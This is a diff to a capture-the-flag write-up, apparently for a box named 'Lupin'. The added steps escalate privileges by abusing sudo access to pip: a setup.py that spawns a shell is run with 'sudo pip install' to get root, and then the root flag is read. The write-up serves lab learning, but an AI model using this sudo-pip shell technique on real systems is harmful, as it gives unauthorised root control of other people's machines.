@@ -126,5 +126,18 @@
         - "/usr/bin/pip" is executable as a root user  
 
 ## Privilege Escalation  
-1. 
-    * 
+1. Exploit the pip command
+    * Execute the following commands  
+    ![PIP-command](./img/lupin_server16.png)  
+        - `cd /tmp`  
+        - `TF=$(mktemp -d)`  
+        - "mktemp -d": make a temporarily safe directory  
+        - `echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh < $(tty) > $(tty) 2> $(tty)')" > $TF/setup.py`  
+        - `sudo pip install $TF`  
+
+## Credential Access  
+1. Open the root flag file  
+    * Open the root.txt  
+    ![Root-flag](./img/lupin_server17.png)  
+        - `cd /root`  
+        - `cat root.txt`  
